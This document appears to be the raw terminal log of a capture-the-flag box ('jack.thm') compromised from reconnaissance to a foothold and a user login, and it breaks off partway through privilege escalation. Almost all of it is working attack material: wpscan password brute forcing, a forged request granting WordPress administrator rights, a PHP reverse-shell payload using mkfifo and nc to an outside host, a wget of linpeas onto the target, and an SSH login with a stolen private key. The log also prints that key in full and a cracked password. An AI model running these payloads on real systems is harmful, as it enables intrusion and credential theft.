```
root@kali:~# nmap -sV -sC -T5 -p- 10.10.63.203
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 13:29 UTC
Nmap scan report for ip-10-10-63-203.eu-west-1.compute.internal (10.10.63.203)
Host is up (0.0023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
MAC Address: 02:59:4E:31:F2:78 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service
```


```
root@kali:~# gobuster dir -u http://jack.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://jack.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/07/09 13:32:10 Starting gobuster
===============================================================
/index.php (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/wp-content (Status: 301)
/admin (Status: 302)
/wp-login.php (Status: 200)
/license.txt (Status: 200)
/wp-includes (Status: 301)
/wp-register.php (Status: 301)
/javascript (Status: 301)
```

# wpscan
```
Scan Aborted: The url supplied 'http://jack.thm--enumerate/' seems to be down (Couldn't resolve host name)
root@kali:~# wpscan --url http://jack.thm --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ R
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/
[+] Started: Fri Jul 10 11:24:08 2020

Interesting Finding(s):

[+] http://jack.thm/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2020-01-17T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.0.8
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] jack
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://jack.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wendy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] danny
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Fri Jul 10 11:24:11 2020
[+] Requests Done: 56
[+] Cached Requests: 9
[+] Data Sent: 12.586 KB
[+] Data Received: 355.445 KB
[+] Memory used: 119.148 MB
[+] Elapsed time: 00:00:02
root@kali:~#
```


# wpscan pass brute
```
root@kali:~# wpscan -U user.txt -P /usr/share/wordlists/fasttrack.txt --url http://jack.thm
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ R
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://jack.thm/
[+] Started: Fri Jul 10 11:26:27 2020

Interesting Finding(s):

[+] http://jack.thm/
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://jack.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://jack.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://jack.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://jack.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://jack.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.3.2 identified (Insecure, released on 2019-12-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://jack.thm/index.php/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>
 |  - http://jack.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.3.2</generator>

[+] WordPress theme in use: online-portfolio
 | Location: http://jack.thm/wp-content/themes/online-portfolio/
 | Last Updated: 2020-01-17T00:00:00.000Z
 | Readme: http://jack.thm/wp-content/themes/online-portfolio/readme.txt
 | [!] The version is out of date, the latest version is 0.0.8
 | Style URL: http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2
 | Style Name: Online Portfolio
 | Style URI: https://www.amplethemes.com/downloads/online-protfolio/
 | Description: Online Portfolio WordPress portfolio theme for building personal website. You can take full advantag...
 | Author: Ample Themes
 | Author URI: https://amplethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 0.0.7 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://jack.thm/wp-content/themes/online-portfolio/style.css?ver=5.3.2, Match: 'Version: 0.0.7'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=============================================================================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - wendy / changelater
Trying danny / starwars Time: 00:00:07 <==============================================================================================> (646 / 646) 100.00% Time: 00:00:07

[i] Valid Combinations Found:
 | Username: wendy, Password: changelater

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Fri Jul 10 11:26:39 2020
[+] Requests Done: 671
[+] Cached Requests: 34
[+] Data Sent: 318.596 KB
[+] Data Received: 417.398 KB
[+] Memory used: 205.371 MB
[+] Elapsed time:
```

# wordpress priviledge escarete
- profile > update > intercept & add parameter [ure_other_roles=administrator]

```
POST /wp-admin/profile.php HTTP/1.1
Host: jack.thm
User-Agent: Mozilla/5.0 (X11; CrOS armv7l 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://jack.thm/wp-admin/profile.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 342
Origin: http://jack.thm
Connection: close
Cookie: wordpress_07f87507b491ce41808428c8c499655c=wendy%7C1594553306%7CjXj1gCfOFJSHlbLSlOVlnp9DKjphtxjfpX4sYRodPm1%7C6c5cebbf27cf3d41aa0add9f7e93b3152489b0f45cd59de552f84c5c7464f0ac; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_07f87507b491ce41808428c8c499655c=wendy%7C1594553306%7CjXj1gCfOFJSHlbLSlOVlnp9DKjphtxjfpX4sYRodPm1%7Cde5dfca34c05449b16ad441f5ce0176d79753fc9de24fb8d7bc2ccd7f8c1cf4b; wp-settings-time-2=1594381027; wp-settings-2=mfold%3Do
Upgrade-Insecure-Requests: 1

_wpnonce=bc9d69ae90&_wp_http_referer=%2Fwp-admin%2Fprofile.php&from=profile&checkuser_id=2&color-nonce=166ccabd2d&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=wendy&display_name=wendy&email=wendy%40tryhackme.com&url=&description=&pass1=&pass2=&action=update&user_id=2&submit=Update+Profile&ure_other_roles=administrator
```

# reverseshell
- plugin editor
- <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.54.25 1234 >/tmp/f');?>
- avtivate

```
root@kali:~# nc -lnvp
nc: option requires an argument -- 'p'
nc -h for help
root@kali:~# nc -lnvp 1234
listening on [any] 1234 ...
ls
connect to [10.10.54.25] from (UNKNOWN) [10.10.201.66] 54310
/bin/sh: 0: can't access tty; job control turned off
$ about.php
$ whoami
www-data
```

# user.txt
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@jack:/var/www/html/wp-admin$ cd /home
cd /home
www-data@jack:/home$ ls
ls
jack
www-data@jack:/home$ cd jack
cd jack
www-data@jack:/home/jack$ ls
ls
reminder.txt  user.txt
www-data@jack:/home/jack$ cat user.txt
cat user.txt
0052f7829e48752f2e7bf50f1231548a
www-data@jack:/home/jack$ cat reminder.txt
cat reminder.txt

Please read the memo on linux file permissions, last time your backups almost got us hacked! Jack will hear about this when he gets back.
```

# linux enum
```
www-data@jack:/home/jack$ cd /tmp
cd /tmp
www-data@jack:/tmp$ wget http://10.10.201.66:8081/linpeas.sh
wget http://10.10.201.66:8081/linpeas.sh
--2020-07-10 06:55:07--  http://10.10.201.66:8081/linpeas.sh
Connecting to 10.10.201.66:8081... failed: Connection refused.
www-data@jack:/tmp$ wget http://10.10.54.25:8081/linpeas.sh
wget http://10.10.54.25:8081/linpeas.sh
--2020-07-10 06:55:34--  http://10.10.54.25:8081/linpeas.sh
Connecting to 10.10.54.25:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 222708 (217K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 217.49K  --.-KB/s    in 0.002s

2020-07-10 06:55:34 (139 MB/s) - 'linpeas.sh' saved [222708/222708]

www-data@jack:/tmp$ ls
ls
f
linpeas.sh
systemd-private-981f61e24abb4d81b2f08dbbb4efd338-systemd-timesyncd.service-9qBeZl
www-data@jack:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@jack:/tmp$
```


```
[+] Looking for ssl/ssh files
/var/backups/id_rsa
Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
  --> Some certificates were found (out limited):
/etc/apache2/sites-enabled

 --> /etc/hosts.allow file found, read the rules:
```

```
www-data@jack:/var/backups$ ls
ls
alternatives.tar.0        dpkg.diversions.1.gz    gshadow.bak
apt.extended_states.0     dpkg.statoverride.0     id_rsa
apt.extended_states.1.gz  dpkg.statoverride.1.gz  passwd.bak
dpkg.arch.0               dpkg.status.0           shadow.bak
dpkg.arch.1.gz            dpkg.status.1.gz
dpkg.diversions.0         group.bak
www-data@jack:/var/backups$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAxfBR9F9V5G2snv1Xaaxv3VHbFZ2VZRwGyU+ah6komBeaAldr
8SNK1x0wu/eXjLjrWnVaYOEU2YUrHzn/duB3Wvm8xyA0T8x/WbV2osWaVOafkPSv
YpV4OdQrdRoS3PEOXRnS+CnOTAgPWo2+xfH1XeldFw9XiYrprTugmwCcYDuBZB3r
zmWA8sPWjLjs6xzNK26RQQbo9zaxwfEdjZ3an9JngJJ7m0rtF9vKeCRfO1V8sd/t
1lu96Kqn4FZUTXQFEGfAYupG6b3vpRwqmI6y2VjK5MxlMmEdwP8oxmKR4XRqvSK1
8m5byz8ZUu1RfB8Ug/pKK9VVbk9QFWbrV4E3FwIDAQABAoIBAEEr0TAOu68MVUu7
yi4m8mYCb4n8apXx1mIt7YlBLvZ0vuaKdiXdIuUU3VjmOmXA9OzButIvCbhc2kfb
xrsTSPkRRRCjD9Y+VKfq0XbibOALVvpZNe3VnNIdg3l47kEEtV/+ArJmwV/TP4rn
JKrz8X/MODRBfubwb+Pzv/uJBfPAzvkokKUp9D2LqNjQEY4w71j0yUl+A0xnkT4i
L1FbzghdARExy2cJN0RfdDKhy/DfXos7+JHso3ZvXmSx0ivS+HyCblO25Kcmy4Vh
FZotNk+28iw6DKm1wrgAjj0sdLpB6jW9+M/kSQCovMijPM8h8JNPLNOJMFSKWBH8
m9US/XECgYEA+AW0bbMVoylAcWGold85Ileyuw/q3HwsDdRrO43uMZvQe8f5TRsd
Q9SvAEz9T46YErySq33jOPmsGLf02EEiyGggpBiuhi3FmtMa7440qGFig4Q5IVxn
QuSDUQvxN/uVE+TZxlRPTUeAFPcAI4DAUYbubAcJzvXeAsCPsKbQGw0CgYEAzE42
H8SUWiCMXBMotEUpn14pGcP4O+hei9j7P1Nupy/F63UtYPvXN4oi75YeLiInUXzU
S/r3+AxoNafMAy67oQhLKHXs+NOP5aEkVhNDhHFNpWutYPn9aLWUIx1tXbWsaecE
i7OCxjp0L5lDRVl3TLzXeZmtp0oSAPKNRYmgQbMCgYAvL0aoKA3RwKNV7rJX8OO5
uN1z4Q9ZavYmm2bbKaFLJs1+/whatvHWWbwBXqRCYmpkBiQRJB36VOV8vmKCUcIA
Rm8PSPLK7CJP1iGluXQjJIPNaXZE9oNeooKpBJCbie1On5ceuCNuHFAtrOAF4RS1
beol+yDOks/tzhyICvREcQKBgCHIiRClu/ZPTYZoMKHmkeRleJxnGGQnn4K2hY1K
KZEByFOQE8nmuwbXE8HUa/cq9J936c8Kl/hvbMf6kDSyhJozOeJd5aqbqT7Kb6zA
ELkU10cUUB4qGGo5JF7OHeiSAwmcBtdm/qfywIWibUpJaf3JeEQGUn3INMPtV8j4
4gQbAoGBAKuXPITKuO7SsRfXcwB3MO3iCTLdW7BYnYF1SzVbPBonmcsxlQinvoRg
2faWmSFAUK6cIys9za3pzOw3FP8W9Q5SGsA9KriSYj6/h7ei9GeJAr3mxlbGnkZN
ZFqUVe2Jvxq++O6Ub41zUtWINbR5Fxf+kTlJIIwqc6IuzZq+QWXy
-----END RSA PRIVATE KEY-----
www-data@jack:/var/backups$
```

# access as jack
```
oot@kali:~# ssh -i id_rsa jack@10.10.201.66
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

143 packages can be updated.
92 updates are security updates.


Last login: Fri Jan 10 18:44:51 2020 from 192.168.1.137
jack@jack:~$ ls
reminder.txt  user.txt
jack@jack:~$ whoami
jack
jack@jack:~$ cd /root
jack@jack:/root$ ls
ls: cannot open directory '.': Permission denied
```


```
ack@jack:/tmp$ chmod +x pspy64
jack@jack:/tmp$ ./pspy64
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ??a???    ??????  ??a??? a??   ??a
    a??a  ??aa??    a a??a  ??aa??  ??a
    a??a ??aaa a???   a??a ??aa a?? ??a
    a????aa a  a   ??aa????aa a a ???aa
    a??a a  aa??????aaa??a a  a a ??aaa
    aaaa a  aa aaa a aaaaa a  a  ??aaa
    aa a     a aa  a aaa a     a?? aaa
    aa       a  a  a  aa       a a aa
                   a           a a
                               a a

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/07/10 07:18:53 CMD: UID=0    PID=963    | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
2020/07/10 07:18:53 CMD: UID=0    PID=942    | /sbin/iscsid
2020/07/10 07:18:53 CMD: UID=0    PID=941    | /sbin/iscsid
2020/07/10 07:18:53 CMD: UID=111  PID=937    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
2020/07/10 07:18:53 CMD: UID=0    PID=935    | /usr/lib/snapd/snapd
2020/07/10 07:18:53 CMD: UID=108  PID=930    | /usr/sbin/rsyslogd -n
2020/07/10 07:18:53 CMD: UID=0    PID=924    | /usr/lib/accountsservice/accounts-daemon
2020/07/10 07:18:53 CMD: UID=0    PID=922    | /usr/sbin/acpid
2020/07/10 07:18:53 CMD: UID=0    PID=919    | /usr/bin/lxcfs /var/lib/lxcfs/
2020/07/10 07:18:53 CMD: UID=0    PID=907    | /usr/sbin/cron -f
2020/07/10 07:18:53 CMD: UID=0    PID=9      |
2020/07/10 07:18:53 CMD: UID=0    PID=899    | /lib/systemd/systemd-logind
2020/07/10 07:18:53 CMD: UID=0    PID=892    | /usr/sbin/atd -f
2020/07/10 07:18:53 CMD: UID=0    PID=84     |
2020/07/10 07:18:53 CMD: UID=0    PID=83     |
2020/07/10 07:18:53 CMD: UID=0    PID=82     |
2020/07/10 07:18:53 CMD: UID=0    PID=8      |
2020/07/10 07:18:53 CMD: UID=0    PID=735    | /sbin/dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
2020/07/10 07:18:53 CMD: UID=0    PID=7      |
2020/07/10 07:18:53 CMD: UID=0    PID=69     |
2020/07/10 07:18:53 CMD: UID=0    PID=64     |
2020/07/10 07:18:53 CMD: UID=0    PID=62     |
2020/07/10 07:18:53 CMD: UID=0    PID=61     |
2020/07/10 07:18:53 CMD: UID=0    PID=60     |
2020/07/10 07:18:53 CMD: UID=0    PID=59     |
2020/07/10 07:18:53 CMD: UID=0    PID=58     |
2020/07/10 07:18:53 CMD: UID=0    PID=57     |
2020/07/10 07:18:53 CMD: UID=0    PID=56     |
2020/07/10 07:18:53 CMD: UID=0    PID=55     |
2020/07/10 07:18:53 CMD: UID=0    PID=54     |
2020/07/10 07:18:53 CMD: UID=0    PID=53     |
2020/07/10 07:18:53 CMD: UID=0    PID=52     |
2020/07/10 07:18:53 CMD: UID=0    PID=51     |
2020/07/10 07:18:53 CMD: UID=0    PID=50     |
2020/07/10 07:18:53 CMD: UID=0    PID=5      |
2020/07/10 07:18:53 CMD: UID=0    PID=49     |
2020/07/10 07:18:53 CMD: UID=102  PID=488    | /lib/systemd/systemd-timesyncd
2020/07/10 07:18:53 CMD: UID=0    PID=465    | /lib/systemd/systemd-udevd
2020/07/10 07:18:53 CMD: UID=0    PID=429    |
2020/07/10 07:18:53 CMD: UID=0    PID=427    |
2020/07/10 07:18:53 CMD: UID=0    PID=426    |
2020/07/10 07:18:53 CMD: UID=0    PID=425    |
2020/07/10 07:18:53 CMD: UID=0    PID=424    |
2020/07/10 07:18:53 CMD: UID=0    PID=409    |
2020/07/10 07:18:53 CMD: UID=0    PID=408    | /sbin/lvmetad -f
2020/07/10 07:18:53 CMD: UID=0    PID=381    |
2020/07/10 07:18:53 CMD: UID=0    PID=380    |
2020/07/10 07:18:53 CMD: UID=0    PID=374    | /lib/systemd/systemd-journald
2020/07/10 07:18:53 CMD: UID=0    PID=33     |
2020/07/10 07:18:53 CMD: UID=0    PID=328    |
2020/07/10 07:18:53 CMD: UID=0    PID=32     |
2020/07/10 07:18:53 CMD: UID=0    PID=31     |
2020/07/10 07:18:53 CMD: UID=1000 PID=30227  | ./pspy64
2020/07/10 07:18:53 CMD: UID=1000 PID=30116  | -bash
2020/07/10 07:18:53 CMD: UID=1000 PID=30115  | sshd: jack@pts/1
2020/07/10 07:18:53 CMD: UID=1000 PID=30052  | (sd-pam)
2020/07/10 07:18:53 CMD: UID=1000 PID=30051  | /lib/systemd/systemd --user
2020/07/10 07:18:53 CMD: UID=0    PID=30049  | sshd: jack [priv]
2020/07/10 07:18:53 CMD: UID=0    PID=300    |
2020/07/10 07:18:53 CMD: UID=0    PID=30     |
2020/07/10 07:18:53 CMD: UID=0    PID=3      |
2020/07/10 07:18:53 CMD: UID=0    PID=299    |
2020/07/10 07:18:53 CMD: UID=0    PID=272    |
2020/07/10 07:18:53 CMD: UID=0    PID=27     |
2020/07/10 07:18:53 CMD: UID=0    PID=26     |
2020/07/10 07:18:53 CMD: UID=0    PID=25     |
2020/07/10 07:18:53 CMD: UID=0    PID=240    |
2020/07/10 07:18:53 CMD: UID=0    PID=24     |
2020/07/10 07:18:53 CMD: UID=0    PID=23     |
2020/07/10 07:18:53 CMD: UID=0    PID=22     |
2020/07/10 07:18:53 CMD: UID=0    PID=21     |
2020/07/10 07:18:53 CMD: UID=0    PID=2026   |
2020/07/10 07:18:53 CMD: UID=0    PID=2024   |
2020/07/10 07:18:53 CMD: UID=0    PID=20     |
2020/07/10 07:18:53 CMD: UID=0    PID=2      |
2020/07/10 07:18:53 CMD: UID=33   PID=1923   | /bin/bash
2020/07/10 07:18:53 CMD: UID=33   PID=1922   | python -c import pty; pty.spawn("/bin/bash")
2020/07/10 07:18:53 CMD: UID=33   PID=1908   | /bin/sh -i
2020/07/10 07:18:53 CMD: UID=33   PID=1904   | sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.54.25 1234 >/tmp/f
2020/07/10 07:18:53 CMD: UID=0    PID=19     |
2020/07/10 07:18:53 CMD: UID=33   PID=1879   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=0    PID=18     |
2020/07/10 07:18:53 CMD: UID=33   PID=1787   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1786   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1774   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1764   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1761   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=0    PID=17     |
2020/07/10 07:18:53 CMD: UID=33   PID=1636   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1635   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1634   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=33   PID=1633   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=0    PID=16     |
2020/07/10 07:18:53 CMD: UID=0    PID=156    |
2020/07/10 07:18:53 CMD: UID=0    PID=15     |
2020/07/10 07:18:53 CMD: UID=0    PID=1480   |
2020/07/10 07:18:53 CMD: UID=0    PID=14     |
2020/07/10 07:18:53 CMD: UID=0    PID=139    |
2020/07/10 07:18:53 CMD: UID=0    PID=138    |
2020/07/10 07:18:53 CMD: UID=0    PID=137    |
2020/07/10 07:18:53 CMD: UID=0    PID=136    |
2020/07/10 07:18:53 CMD: UID=0    PID=135    |
2020/07/10 07:18:53 CMD: UID=0    PID=134    |
2020/07/10 07:18:53 CMD: UID=0    PID=133    |
2020/07/10 07:18:53 CMD: UID=0    PID=132    |
2020/07/10 07:18:53 CMD: UID=0    PID=131    |
2020/07/10 07:18:53 CMD: UID=0    PID=13     |
2020/07/10 07:18:53 CMD: UID=0    PID=1283   | logger -t mysqld -p daemon error
2020/07/10 07:18:53 CMD: UID=118  PID=1282   | /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
2020/07/10 07:18:53 CMD: UID=0    PID=12     |
2020/07/10 07:18:53 CMD: UID=0    PID=1157   | /usr/sbin/apache2 -k start
2020/07/10 07:18:53 CMD: UID=0    PID=1130   | /bin/bash /usr/bin/mysqld_safe
2020/07/10 07:18:53 CMD: UID=0    PID=11     |
2020/07/10 07:18:53 CMD: UID=0    PID=1090   | /usr/sbin/sshd -D
2020/07/10 07:18:53 CMD: UID=0    PID=1070   | /sbin/agetty --noclear tty1 linux
2020/07/10 07:18:53 CMD: UID=0    PID=1067   | /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
2020/07/10 07:18:53 CMD: UID=0    PID=1048   | /usr/lib/policykit-1/polkitd --no-debug
2020/07/10 07:18:53 CMD: UID=0    PID=10     |
2020/07/10 07:18:53 CMD: UID=0    PID=1      | /sbin/init
2020/07/10 07:20:01 CMD: UID=0    PID=30242  | /usr/bin/python /opt/statuscheck/checker.py
2020/07/10 07:20:01 CMD: UID=0    PID=30241  | /bin/sh -c /usr/bin/python /opt/statuscheck/checker.py
2020/07/10 07:20:01 CMD: UID=0    PID=30240  | /usr/sbin/CRON -f
2020/07/10 07:20:01 CMD: UID=0    PID=30243  | /usr/bin/python /opt/statuscheck/checker.py
2020/07/10 07:20:01 CMD: UID=0    PID=30244  | sh -c /usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log

```

```
jack@jack:/tmp$ cd /opt/statuscheck/
jack@jack:/opt/statuscheck$ ls
checker.py  output.log
jack@jack:/opt/statuscheck$ cat checker.py
import os

os.system("/usr/bin/curl -s -I http://127.0.0.1 >> /opt/statuscheck/output.log")
jack@jack:/opt/statuscheck$ ls /usr/lib/
accountsservice    gcc                libDeployPkg.so.0.0.0  libvmtools.so.0               modules-load.d  python3              tc
apache2            git-core           libguestlib.so.0       libvmtools.so.0.0.0           mysql           python3.5            tmpfiles.d
apt                gnupg              libguestlib.so.0.0.0   libxmlsec1-openssl.so.1       openssh         rsyslog              ubuntu-release-upgrader
binfmt.d           groff              libhgfs.so.0           libxmlsec1-openssl.so.1.2.20  open-vm-tools   sasl2                update-notifier
byobu              grub               libhgfs.so.0.0.0       libxmlsec1.so.1               os-prober       sftp-server          valgrind
cgi-bin            grub-legacy        libmcrypt.so.4         libxmlsec1.so.1.2.20          os-probes       snapd                x86_64-linux-gnu
